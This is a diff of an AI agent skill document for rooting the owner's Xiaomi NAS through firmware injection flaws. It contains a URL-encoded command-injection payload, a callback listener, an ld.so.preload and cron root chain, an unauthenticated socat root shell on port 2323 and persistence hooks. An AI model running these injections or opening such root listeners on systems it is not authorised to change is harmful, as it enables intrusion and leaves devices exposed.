@@ -1,324 +1,155 @@
 ---
 name: xiaomi-nas-ssh-root
-description: 通过小米智能存储 App 的客户端证书 + WebDAV 路径注入为用户自己的小米 NAS 开启或恢复 SSH/root，并部署、诊断和验证普通整机重启后的 SSH 持久化。也用于复现“小米 NAS 稳定 SSH”流程或继续该设备的 root 调查。
+description: >
+  Re-root an owner's Xiaomi NAS RP05 on firmware 1.0.9.462 from macOS: run the in-repo
+  UCI-heredoc root tool, restore a usable SSH command shell with a compatible Dropbear,
+  restart root after reboot, and persist SSH across ordinary reboots. Use when SSH
+  authenticates but shows the MINAS banner and ignores commands, root was lost after an
+  OTA, or the user asks to re-root a 1.0.9.x NAS.
+metadata:
+  version: "2.0.0"
 ---
 
-# Xiaomi NAS SSH/root enablement via certified WebDAV injection
+# Xiaomi NAS root SSH — firmware 1.0.9.462 (macOS)
 
-Use this skill when the user asks to open/enable SSH/root on their local Xiaomi NAS/RP05, or continue the local Xiaomi NAS SSH enablement process. Prefer the integrated scripts in this repo.
+Ready-to-use package: this skill plus `scripts/xiaomi-nas-root.py`. Verified on an owned
+device on 2026-10-20 (firmware 1.0.9.462.F24C26D24-REL, Apple Silicon, Python 3.11,
+keystone-engine 0.9.2). Each chain stage ran successfully on the real device; a full
+unattended end-to-end replay from a clean state has not been performed.
 
-Safety/authorization:
-- Only run against the user's own NAS on their LAN.
-- Treat LAN IPs, app account/password, WebDAV password, tokens, cert private keys, and SSH private keys as sensitive. Do not expose exact IPs or secrets in chat unless the user explicitly asks.
-- Never exfiltrate or print private keys except paths and fingerprints. Do not paste private key content into chat.
-- Prefer dry-run/verification steps before state-changing injection.
-- When working in this repo's `persistence-research` branch, record project-specific investigation conclusions in `research/analyst.md`, not `~/issuebase/`; keep raw device identifiers out of that analysis file.
+## When this applies
 
-Runtime/owner-specific context:
-- Always ask for or detect the current owner's `NAS_IP` at runtime. Do not hard-code a previous user's/device's IP into commands, scripts, pcap filenames, summaries, or chat replies.
-- Derive `WORK_IP` from the active route/interface for that `NAS_IP`; do not assume a fixed subnet.
-- Xiaomi NAS desktop app path on macOS is usually `/Applications/小米智能存储.app`.
-- Cert directory is commonly inside the app bundle: `/Applications/小米智能存储.app/Contents/Resources/extraResources/cert`.
-- Branch/environment split: `main` keeps the conservative macOS bash runner; `python-cross-platform` contains the Python runner for Windows/Linux/macOS work.
-- Python branch validation: Windows 11 + conda Python 3.13.15, Xiaomi Smart Storage at `C:\Program Files\SmartStorage\小米智能存储.exe`, certs observed after code login/NAS visit in `%LOCALAPPDATA%\minasCert`, end-to-end SSH/root flow completed.
-- Cert basename, client cert CN, server TLS CN, WebDAV username/password, tokens, and dynamic ports are per-device/per-login. Discover them for the current owner and keep them redacted in chat.
-- Current app codesign may become invalid because Xiaomi/app workflows add cert resources under `Contents/Resources/extraResources/cert/`; verify but don't treat this alone as failure.
-- Use Homebrew curl `/opt/homebrew/opt/curl/bin/curl`; Apple `/usr/bin/curl` may fail to load EC client keys with LibreSSL unsupported algorithm.
-- Correct LuCI API path for pool info is `/cgi-bin/luci/filemgr/get_pool_info` (not `/cgi-bin/luci/admin/filemgr/get_pool_info`, which can return 403).
-- Store WebDAV credentials as `username:password` in `/tmp/.wdav_creds` with mode 600. Never print the password in chat.
-- User may need to log into the Xiaomi NAS app using account/password before monitoring; treat app-derived tokens/WebDAV credentials as sensitive secrets.
-- Historical issue notes may exist under `~/issuebase/mi-nas/`, but new persistence research for this project belongs in `research/analyst.md`.
-- Ready-made runners live in this repo under `scripts/`.
-- On `main`, use `scripts/enable-xiaomi-nas-ssh.sh`.
-- When root SSH already works and the user only wants ordinary-reboot persistence, do not rerun the certificate/WebDAV enablement flow. With authorization to change the NAS, run `scripts/install-ssh-persistence.sh`; it defaults to the `xiaomi-nas` SSH alias and also accepts a root SSH target as its first argument.
-- For Windows/cross-platform work, switch to branch `python-cross-platform` and use `scripts/enable-xiaomi-nas-ssh-py.py`; if Windows cert auto-discovery fails, pass `--cert-dir "%LOCALAPPDATA%\minasCert"`.
-- For reboot persistence, boot-order diagnosis, recovery after port 22 closes, and rollback, read [references/reboot-persistence.md](references/reboot-persistence.md) before changing the NAS.
+- SSH authenticates but shows the MINAS banner and ignores commands.
+- Firmware 1.0.9.462's Dropbear forces `/usr/sbin/mi-shell`; the binary contains a
+  hardcoded mi-shell reference, the older firmware's Dropbear does not.
+- The older WebDAV video-segment injection (this repo's `main` branch) is patched in
+  1.0.9.x — do not retry it there.
+- Host: macOS only. Windows/Linux are not implemented in this branch.
 
-Required inputs:
-- `NAS_IP`: NAS LAN IP. Keep exact value local/redacted in chat.
-- `CN`: certificate DNS/common name used with `--resolve`.
-- cert files copied from the Xiaomi NAS client cert directory, four `.pem` files:
-  - `<UID>_<SERIAL>_cert.pem`
-  - `<UID>_<SERIAL>_private_key.pem`
-  - `<UID>_<SERIAL>_csr.pem`
-  - `ca_chain.pem`
-- `USERNAME`: NAS API/WebDAV response username. A WebDAV object at `/pool0/data/Docker/...` is visible on the NAS at `/home/<USERNAME>/pool0/data/Docker/...` on the validated firmware; verify this mapping instead of assuming `/nas/pool0/<USERNAME>/...`.
-- `CREDS`: WebDAV `username:password` from API response.
-- `WORK_IP`: workstation LAN IP reachable by NAS, e.g. `hostname -I` or `ipconfig getifaddr en0`.
+## Precautions — read before running
 
-Cert preparation:
-```sh
-NAS_IP="<NAS_IP>"
-WORK_IP="$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)"
-CERT_DIR="/tmp/minascert"
-mkdir -p "$CERT_DIR" && chmod 700 "$CERT_DIR"
-chmod 600 "$CERT_DIR"/*.pem
-ls "$CERT_DIR"/*.pem   # expect 4 files
-```
+- Own-device use only. Reading this skill never authorizes injection, reboots, or
+  NAS changes; get explicit user confirmation for each.
+- Never publish device IPs, UIDs, serials, WebDAV/SMB passwords, tokens, client or
+  SSH private keys. Runner output and SMB mount URLs can contain live temporary
+  credentials — keep logs private and redact before sharing.
+- The tool uses Samba account/share **slot `_2`** (`sambashare.u<uid>_2` /
+  `sambauser.u<uid>_2`). If the owner already has a second custom SMB share, running
+  the tool can overwrite it and cleanup can delete it. Check existing shares first
+  and stop when slot `_2` is in use.
+- The tool arms `/etc/ld.so.preload`. It disarms itself on both success and failure
+  paths, but if the run is interrupted abnormally you must disarm it manually through
+  whatever root channel exists — an armed preload reloads into every dynamic process.
+- Re-running is safe in principle: keys are appended only if absent, and the
+  credential pool is refreshed each run. Do not run twice concurrently.
+- Do not attempt `mitee_tool rpmb set ssh_en` as an unlock: it is TEE
+  challenge-response gated and fails with `rpmb set verify failed`. No vendor-side
+  SSH unlock is available.
+- Do not attempt a sysota downgrade: blocked by an RPMB `downgrade_en` gate with TEE
+  verification.
 
-Derive `<UID>_<SERIAL>` from filenames:
-```sh
-CERT_BASENAME="$(basename "$(ls "$CERT_DIR"/*_cert.pem | head -1)" _cert.pem)"
-CLIENT_CERT="$CERT_DIR/${CERT_BASENAME}_cert.pem"
-CLIENT_KEY="$CERT_DIR/${CERT_BASENAME}_private_key.pem"
-CA_CERT="$CERT_DIR/ca_chain.pem"
-```
+## Root chain (verified steps)
 
-Derive/verify CN if possible:
-```sh
-openssl x509 -in "$CLIENT_CERT" -noout -subject -issuer -dates
-# If the owner already knows the CN, use that exact DNS name.
-```
+Source layout: `scripts/xiaomi-nas-root.py` (this repo, adapted from
+[lvmaple/minas_plugin](https://github.com/lvmaple/minas_plugin) with macOS fixes:
+`mount_smbfs`, share-name fallback `etc-<uid>` after repair, `/bin/sh` payload,
+portable socket-based cleanup).
 
-Set curl cert args:
-```sh
-CN="<CN>"
-CERT_ARGS="--cacert $CA_CERT --cert $CLIENT_CERT --key $CLIENT_KEY --resolve $CN:443:$NAS_IP"
-CERT_ARGS_WD="--cacert $CA_CERT --cert $CLIENT_CERT --key $CLIENT_KEY --resolve $CN:5000:$NAS_IP"
-```
-
-Get WebDAV credentials:
-```sh
-curl -s $CERT_ARGS -X POST -d '{"selector":["webDAV"]}' \
-  "https://$CN/cgi-bin/luci/filemgr/get_pool_info" | python3 -m json.tool
-# Extract response webDAV fields: username, password, port=5000.
-
-echo "<username>:<password>" > /tmp/.wdav_creds && chmod 600 /tmp/.wdav_creds
-CREDS="$(cat /tmp/.wdav_creds)"
-USERNAME="<username>"
-```
-
-Verify WebDAV upload:
-```sh
-echo hi > /tmp/test.txt
-curl -s -u "$CREDS" $CERT_ARGS_WD -T /tmp/test.txt \
-  "https://$CN:5000/pool0/data/test.txt" -w 'PUT: %{http_code}\n' -o /dev/null
-# Expected: PUT: 204
-```
-
-Listener for command output:
-```sh
-cat >/tmp/nas_listener.py <<'PY'
-import socket, sys, time
-HOST='0.0.0.0'; PORT=8124
-s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((HOST, PORT)); s.listen(5); s.settimeout(40)
-print(f'LISTEN {HOST}:{PORT}', flush=True)
-try:
-    c,a=s.accept(); print('FROM', a, flush=True); c.settimeout(3)
-    chunks=[]
-    while True:
-        try:
-            d=c.recv(65535)
-        except socket.timeout:
-            break
-        if not d: break
-        chunks.append(d)
-    data=b''.join(chunks)
-    sys.stdout.buffer.write(data); sys.stdout.flush()
-finally:
-    s.close()
-PY
-kill "$(cat /tmp/nas_listen.pid 2>/dev/null)" 2>/dev/null || true; sleep 1
-nohup python3 /tmp/nas_listener.py > /tmp/nas_listen_out.txt 2>&1 &
-echo $! > /tmp/nas_listen.pid
-sleep 1
-```
-
-Injection primitives:
-- The WebDAV URL path begins under `/pool0/video/` and ends `__.ts`.
-- Shell commands are injected by URL-encoded `bash -c` style payloads.
-- Paths containing `/` must not appear raw in the command payload; construct them with encoded `printf` sequences.
-- After each injection, check `/tmp/nas_listen_out.txt`.
-
-Low-risk tests:
-```sh
-# 3-second delay test; expected curl elapsed around 3 seconds.
-P="/pool0/video/__x%22%3Bsleep%203%3B%22__.ts"
-time curl -s -o /dev/null --max-time 15 -g -u "$CREDS" $CERT_ARGS_WD "https://$CN:5000$P"
-
-# docker ps output回传: use the exact encoded form from the integrated runner.
-# Expected: listener output includes docker ps table.
-```
-
-SSH key generation/upload:
-```sh
-ssh-keygen -t ed25519 -f /tmp/nas-root-key -N '' -C "nas-root-$(date +%F)"
-chmod 600 /tmp/nas-root-key
-cat /tmp/nas-root-key.pub
-
-curl -s -u "$CREDS" $CERT_ARGS_WD -T /tmp/nas-root-key.pub \
-  "https://$CN:5000/pool0/data/Docker/authorized_keys" -o /dev/null
-```
-
-NAS-side script to install the key as dropbear authorized_keys:
-```sh
-cat >/tmp/setkey.sh <<'SH'
-#!/bin/sh
-install -d -m 700 /etc/dropbear
-install -m 600 /home/<USERNAME>/pool0/data/Docker/authorized_keys /etc/dropbear/authorized_keys
-echo KEY_OK
-SH
-# replace <USERNAME>, upload to /pool0/data/Docker/setkey.sh, then trigger via injection and expect KEY_OK.
-```
-
-NAS-side script to change root shell:
-```sh
-cat >/tmp/setshell.sh <<'SH'
-#!/bin/sh
-mkdir -p /runtime 2>/dev/null || true
-cp /etc/passwd /runtime/passwd.bak-pre-ssh 2>/dev/null || cp /etc/passwd /tmp/passwd.bak-pre-ssh 2>/dev/null || true
-usermod -s /bin/sh root
-echo SHELL_OK
-SH
-# upload to /pool0/data/Docker/setshell.sh, trigger via injection, expect SHELL_OK.
-```
-
-Enable dropbear for the current boot with `systemctl start dropbear.socket`. Do not report
-`mitee_tool rpmb set ssh_en true` as successful: `rpmb set` prints a challenge, reads a
-second response from stdin, and rejects a plain non-interactive call with
-`rpmb set verify failed`. The vendor `boot_check.sh` will stop Dropbear after reboot when
-`rpmb get ssh_en` is not exactly `true`. Install the validated pool-mounted hook described
-in [references/reboot-persistence.md](references/reboot-persistence.md).
-
-Verify:
-```sh
-nc -vz -G 2 "$NAS_IP" 22
-ssh -i /tmp/nas-root-key -o StrictHostKeyChecking=accept-new root@"$NAS_IP" id
-# Expected: uid=0(root) gid=0(root) ...
-```
-
-Post-enable persistence installer:
-```sh
-# Use this narrow path when root SSH is already available.
-./scripts/install-ssh-persistence.sh
-# Or without a configured alias:
-./scripts/install-ssh-persistence.sh root@'<NAS_IP>'
-```
-The installer atomically writes the validated `98.ssh-persistence` pool hook, verifies its
-`/data/etc/upper` copy, and keeps `dropbear.socket` active for the current boot. Do not run
-it without authorization to modify the NAS. Its `PERSISTENCE_READY` result proves the hook
-is installed and current SSH is active; only a later user-authorized whole-device reboot,
-new boot ID, old-key login, and current-boot journal ordering prove reboot persistence.
-The installer never reboots the NAS.
-
-Integrated step-by-step runner:
-```sh
-# Prefer the repo script; prints [step] + OK/WARN/FAIL after each stage.
-NAS_IP='<NAS_IP>' ./scripts/enable-xiaomi-nas-ssh.sh
-# or: ./scripts/enable-xiaomi-nas-ssh.sh '<NAS_IP>'
-```
-Notes for the runner:
-- It must receive the current owner's NAS IP at runtime.
-- It stores WebDAV credentials in `/tmp/.wdav_creds` mode 600 and does not print the password.
-- It stores root SSH key at `/tmp/nas-root-key`; never print/delete the private key.
-- It redacts `NAS_IP`/`WORK_IP` from its command-capture output.
-- It verifies, in order: certs, ports, WebDAV credentials, WebDAV PUT, listener, sleep injection, root id, key upload, `authorized_keys`, root shell, persistent pool hook in both `/etc` and `/data/etc/upper`, dropbear, SSH root id, local SSH config alias.
-- Runner success proves current-boot SSH and installation of the persistence hook. Only a subsequent whole-device reboot with a new boot ID and post-boot journal evidence proves reboot persistence.
-- It copies the root key to `~/.ssh/id_ed25519_xiaomi_nas` and writes/updates this local SSH config block:
-  ```sshconfig
-  Host xiaomi-nas minas
-      HostName <NAS_IP>
-      User root
-      IdentityFile ~/.ssh/id_ed25519_xiaomi_nas
-      IdentitiesOnly yes
-      StrictHostKeyChecking accept-new
-      ConnectTimeout 8
-  ```
-  Then verify with `ssh xiaomi-nas id`.
-
-Monitoring/recovery procedure used to discover app runtime paths and credentials:
-```sh
-# Prefer the repo script:
-./scripts/watch-xiaomi-nas-app.sh
-```
-If that script is missing from the checkout, recreate a compact version from this embedded template under `~/issuebase/mi-nas/scripts/`. Keep exact IP local; pass it through `NAS_IP=...` and do not print it in chat:
-```sh
-mkdir -p "$HOME/issuebase/mi-nas/scripts"
-cat > "$HOME/issuebase/mi-nas/scripts/watch-xiaomi-nas-app.sh" <<'SH'
-#!/usr/bin/env bash
-set -euo pipefail
-: "${NAS_IP:?set NAS_IP to the local NAS address}"
-APP_NAME="${APP_NAME:-小米智能存储}"
-IFACE="${IFACE:-$(ifconfig | awk '/^[a-z0-9]+: flags=/{gsub(":","",$1); i=$1} /inet / && $2 !~ /^127\./{print i; exit}')}"
-ROOT_DIR="${ROOT_DIR:-$HOME/issuebase/mi-nas/captures/app-watch-$(date +%Y%m%d-%H%M%S)}"
-APP_SUPPORT="$HOME/Library/Application Support/$APP_NAME"
-APP_BUNDLE="/Applications/$APP_NAME.app"
-mkdir -p "$ROOT_DIR"
-PCAP="$ROOT_DIR/nas-redacted.pcap"
-CONN_LOG="$ROOT_DIR/connections.log"
-SUMMARY="$ROOT_DIR/summary.txt"
-cat > "$SUMMARY" <<EOF
-Xiaomi NAS app watch
-started: $(date)
-NAS_IP: <redacted>
-IFACE: $IFACE
-APP_NAME: $APP_NAME
-APP_BUNDLE: $APP_BUNDLE
-APP_SUPPORT: $APP_SUPPORT
-PCAP: $PCAP
-EOF
-cleanup(){
-  [[ -n "${TCPDUMP_PID:-}" ]] && kill "$TCPDUMP_PID" 2>/dev/null || true
-  [[ -n "${LOOP_PID:-}" ]] && kill "$LOOP_PID" 2>/dev/null || true
-  wait 2>/dev/null || true
-  {
-    echo "finished: $(date)"
-    echo "Recent cert files:"
-    find "$APP_BUNDLE" "$APP_SUPPORT" -maxdepth 8 \( -iname '*_cert.pem' -o -iname '*_private_key.pem' -o -iname '*_csr.pem' -o -iname 'ca_chain.pem' \) -print 2>/dev/null | sort
-    echo "Recent WebDAV-ish strings from app data:"
-    find "$APP_SUPPORT" -maxdepth 6 -type f -print0 2>/dev/null | xargs -0 strings -a 2>/dev/null | rg -i 'webdav|baseurl|username|password|shareDeviceToken|deviceCurrentInfo|pool0|nas\.' | head -200 || true
-  } >> "$SUMMARY"
-  echo "saved: $ROOT_DIR"
-}
-trap cleanup INT TERM EXIT
-sudo tcpdump -i "$IFACE" -n -s 0 -w "$PCAP" "host $NAS_IP and (tcp port 443 or tcp port 5000 or tcp port 22 or tcp port 8086 or tcp port 36673 or portrange 30000-65535)" >"$ROOT_DIR/tcpdump.log" 2>&1 &
-TCPDUMP_PID=$!
-(
-  while true; do
-    {
-      echo "===== $(date) ====="
-      ps axww -o pid,ppid,user,command | rg -i "$APP_NAME|sso_login|MiNas|SmartStorage" || true
-      lsof -nP -iTCP | rg "$NAS_IP|$APP_NAME|sso_login" || true
-      find "$APP_BUNDLE" "$APP_SUPPORT" -maxdepth 8 \( -iname '*_cert.pem' -o -iname '*_private_key.pem' -o -iname '*_csr.pem' -o -iname 'ca_chain.pem' -o -iname '*.ldb' -o -iname '*.log' \) -print 2>/dev/null | while read -r f; do stat -f '%Sm %z %N' -t '%F %T' "$f" 2>/dev/null; done | sort | tail -80 || true
-    } >> "$CONN_LOG" 2>&1
-    sleep 1
-  done
-) &
-LOOP_PID=$!
-echo "watching; quit/reopen app, enter file manager, then Ctrl-C. Output: $ROOT_DIR"
-while true; do sleep 3600; done
-SH
-chmod +x "$HOME/issuebase/mi-nas/scripts/watch-xiaomi-nas-app.sh"
-```
-Procedure:
-1. Start the watcher in iTerm2, not Apple Terminal. Always set the owner's current NAS IP at run time; do not hard-code another user's IP:
+1. **Environment** — dedicated Conda env, never `base`/venv/user-site:
    ```sh
-   ~/.grok/skills/prefer-iterm2/scripts/open-iterm.sh \
-     "$HOME/issuebase/mi-nas/scripts" "NAS_IP='<NAS_IP>' ./watch-xiaomi-nas-app.sh"
-   # or: ./watch-xiaomi-nas-app.sh '<NAS_IP>'
+   conda create -n minas-root python=3.11 -y   # skip if it exists
+   conda run -n minas-root python -m pip install -r scripts/requirements-1.0.9.462.txt
    ```
-2. Enter sudo password for tcpdump if prompted.
-3. Quit/reopen `/Applications/小米智能存储.app`.
-4. Log in with the user's Xiaomi account/password if needed; do not record or expose that password.
-5. Enter the NAS file manager page and wait 10–20 seconds.
-6. Stop watcher with Ctrl-C.
-7. Analyze latest `~/issuebase/mi-nas/captures/app-watch-*/`:
-   - `connections.log`: app/sso_login processes and NAS dynamic ports.
-   - `nas-<NAS_IP>.pcap`: encrypted traffic metadata; useful for ports/timing, not plaintext TLS credentials.
-   - cert files under app bundle: `Contents/Resources/extraResources/cert/`.
+   On Apple Silicon, if `import keystone` fails with a missing native library, copy
+   Homebrew's `libkeystone.0.dylib` into the env's `site-packages/keystone/`
+   (details in [references/firmware-1.0.9.462.md](references/firmware-1.0.9.462.md)).
+2. **Pre-check** — confirm root is genuinely gone:
+   `ssh -o BatchMode=yes <target> id -u` must NOT succeed. If it returns `0`, stop:
+   root already works; do not re-root.
+3. **Run** — from the repository root:
+   ```sh
+   conda run --no-capture-output -n minas-root python scripts/xiaomi-nas-root.py <NAS_IP>
+   ```
+   The desktop app must be installed and logged into the target NAS (client certs are
+   found automatically under the app bundle). Chain: mTLS cert → `get_pool_info`
+   WebDAV creds → `add_samba_account` UCI heredoc injection → `force user=root` `/etc`
+   SMB share → `/etc/ld.so.preload` + assembled aarch64 trigger `.so` → cron root job
+   → socat root shell on 2323 + SSH pubkey installed + dropbear socket started.
+4. **Verify channels** — socat: `nc <NAS_IP> 2323` gives a root shell. SSH key auth
+   alone is not enough: on this firmware commands still hit mi-shell until the next
+   step. A fresh `uid=0` line in `/etc/.rootpwn.log` proves cron executed; it does
+   not prove the socat listener or SSH exec.
+5. **Restore SSH exec** — firmware 1.0.9.462's Dropbear is patched; bind-mount a known
+   good 1.0.8.425 `dropbearmulti` (owner-supplied from a verified backup; not bundled):
+   ```sh
+   mount --bind /home/rootx/dropbearmulti.good /usr/sbin/dropbearmulti
+   ```
+   Then `ssh -o BatchMode=yes <target> id -u` must return `0`. Do not stack a second
+   bind over an existing one; inspect the target mount first.
+6. **Cleanup** — automatic on success/failure (disarms preload, removes the injected
+   share, staging dir, and the injected Samba system account lines; SSH pubkeys and
+   the `/home/rootx` home change are intentionally kept). Verify the result through
+   real root; a printed `CLEAN_OK` or a generated `cleanup-<ip>.sh` alone proves
+   nothing. **Never blindly delete `sambashare.u<uid>_2`** if the owner has since put
+   a legitimate share in that slot — inspect name/path first.
 
-Observed from monitoring:
-- `sso_login` connects to NAS dynamic ports, e.g. `<NAS_IP>:<dynamic-port>`.
-- The certs were regenerated under the app bundle after login.
-- App code stores cert path inside `extraResources/cert`.
+## Restarting root after a reboot
 
-Validated root command execution primitive:
-```sh
-# Keep actual password in /tmp/.wdav_creds and never echo it in chat.
-# Use URL path injection over WebDAV 5000.
-# 3 second sleep test should take ~3 seconds.
-# A root id回连 test returned: uid=0(root) gid=0(root), shell=/usr/sbin/mi-shell.
-```
+The tool deliberately does not persist everything. After a NAS reboot:
 
-Do not delete `/tmp/nas-root-key`; it is the root SSH identity for this NAS. Keep it private.
+- SSH public keys (`/etc/dropbear/authorized_keys`, `/home/rootx/.ssh/authorized_keys`)
+  and the root home change survive on the `/data` overlay.
+- The socat listener and the Dropbear bind-mount are gone; firmware Dropbear again
+  forces mi-shell, so key auth alone yields the banner.
+- With the persistence hooks below installed, one observed reboot recovered full
+  UID-0 SSH with no manual steps (first connect ~100 s after boot).
+- Without hooks, re-run this chain (keys are reused, not regenerated) or repeat only
+  the bind-mount step through whatever root channel you re-established.
+
+## Persistence (ordinary reboot)
+
+Two syshotplug pool hooks, `/etc/syshotplug/pool/`, mode 0755 — this mechanism is the
+one that demonstrably fires at boot; `/etc/systemd/system/` units do NOT (the `/etc`
+overlay mounts after systemd builds its boot transaction):
+
+- `97.dropbear-unpatch` — on `ACTION=mounted`, bind-mounts
+  `/home/rootx/dropbearmulti.good` over `/usr/sbin/dropbearmulti` if not already a
+  mountpoint. Runs before 98.
+- `98.ssh-persistence` — starts `dropbear.socket`. Also installable standalone via
+  `scripts/install-ssh-persistence.sh <target>` when Dropbear is unpatched.
+
+Full hook bodies and acceptance test: [references/reboot-persistence.md](references/reboot-persistence.md).
+Reboot acceptance requires a changed boot ID, old-key `id -u` → `0`, and the hook log
+lines in the current boot journal. This is ordinary-reboot persistence, not an OTA or
+factory-reset guarantee — recheck hooks after every OTA.
+
+## If the chain fails at a step
+
+- mTLS handshake fails → check cert validity dates; the runner probes server-name
+  role suffixes `.0/.00/.1/.2/.20` automatically.
+- MKCOL 409 → path encoding issue; the runner's relative-`etc` trick handles the
+  observed case.
+- `add_samba_account` returns 2511 (not just 2502) when the share exists — non-fatal
+  for the chain, but first make sure slot `_2` is not a legitimate owner share.
+- socat 2323 never opens → check `/etc/.rootpwn.log` via the root share; `uid=0` there
+  means cron ran and the listener failed (e.g. wrong EXEC shell path) — do not blindly
+  re-arm a live preload.
+- `systemctl restart` inside the socat PTY can D-Bus-stall — use verified SSH or a
+  cron one-shot for service operations.
+- Root lost again after a later OTA → re-verify firmware, keys, hooks, then re-run
+  this chain. Do not attempt sysota downgrade.
+
+## Summary
+
+1. Verify root is really gone (`id -u` must fail).
+2. Conda env → `scripts/xiaomi-nas-root.py <NAS_IP>` → socat root shell + SSH keys.
+3. Bind-mount good Dropbear → `id -u` returns `0` over SSH.
+4. Install hooks 97 + 98 → survives ordinary reboot (verified).
+5. Cleanup is automatic; verify through real root. Keys intentionally persist;
+   re-running after a reboot restores root without regenerating anything.
+
+Details, sanitization rules, and troubleshooting tables:
+[references/firmware-1.0.9.462.md](references/firmware-1.0.9.462.md) ·
+[references/reboot-persistence.md](references/reboot-persistence.md) ·
+[technical review](../docs/technical-review-1.0.9.462.md) ·
+[tool usage](../docs/usage-1.0.9.462.md)
